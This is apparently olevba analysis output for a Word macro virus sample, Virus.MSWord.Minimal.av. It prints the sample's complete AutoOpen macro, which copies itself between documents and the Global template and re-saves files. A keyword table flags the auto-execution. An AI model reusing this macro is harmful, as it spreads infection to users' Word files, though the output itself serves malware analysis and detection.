olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.av-9e92fd04c821af40e185327cf0600c36c6fa197d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.av-9e92fd04c821af40e185327cf0600c36c6fa197d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.av-9e92fd04c821af40e185327cf0600c36c6fa197d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim A$
Dim Z$
Dim B$
On Error Resume Next
A$ = "Global:AutoOpen"
B$ = WordBasic.[FileName$]()
Z$ = B$ + ":AutoOpen"
If A$ = Z$ Then WordBasic.Beep Else WordBasic.MacroCopy A$, Z$, 1
If A$ = Z$ Then WordBasic.Beep Else WordBasic.MacroCopy Z$, A$, 1
If A$ = Z$ Then WordBasic.Beep Else WordBasic.FileSaveAs Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
